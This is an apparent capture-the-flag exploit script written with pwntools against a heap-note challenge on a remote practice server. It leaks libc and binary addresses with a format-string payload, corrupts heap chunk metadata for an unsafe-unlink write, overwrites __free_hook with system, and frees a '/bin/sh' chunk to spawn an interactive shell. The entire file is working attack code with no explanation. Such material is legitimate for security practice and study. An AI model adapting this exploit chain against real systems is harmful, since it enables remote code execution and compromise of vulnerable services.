from pwn import *
context.log_level = 'debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 29678)
elf = ELF('./pwn')
libc = ELF('./libc-2.23.so')

sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)

def add(index, size, content):
	sla(b'>> ', b'1')
	sla(b'Enter the index you want to create (0-10):', str(index).encode())
	sla(b'Enter a size:', str(size).encode())
	sla(b'Enter the content: ', content)

def delete(index):
	sla(b'>> ', b'2')
	sla(b'Enter an index:\n', str(index).encode())
	
def edit(index, content):
	sla(b'>> ', b'4')
	sla(b'Enter an index:\n', str(index).encode())
	sla(b'Enter the content: \n', content)

sla(b'Enter your name: ', b'%15$p%19$p')
io.recvuntil(b'0x')
__libc_start_main = int(io.recvuntil(b'0x', drop=True), 16) - 240
elf_addr = int(io.recvuntil(b'\n', drop=True), 16) - 0x116A
note_addr = elf_addr + 0x202060

log.info('__libc_start_main: ' + hex(__libc_start_main))
log.info('elf base: ' + hex(elf_addr))

libc_base = __libc_start_main - libc.symbols['__libc_start_main']
__free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']


add(0, 0x98, b'a')
add(1, 0xA0, b'/bin/sh')
edit(0, p64(0x10) + p64(0x91) + p64(note_addr - 0x18) + p64(note_addr - 0x10) + cyclic(0x70) + p64(0x90) + b'\xB0')
delete(1)
edit(0, p64(0) * 3 + p64(__free_hook) + p64(0x38) + p64(note_addr + 0x18) + b'/bin/sh\x00')
edit(0, p64(system))
delete(1)
# gdb.attach(io)
# time.sleep(3)

io.interactive()
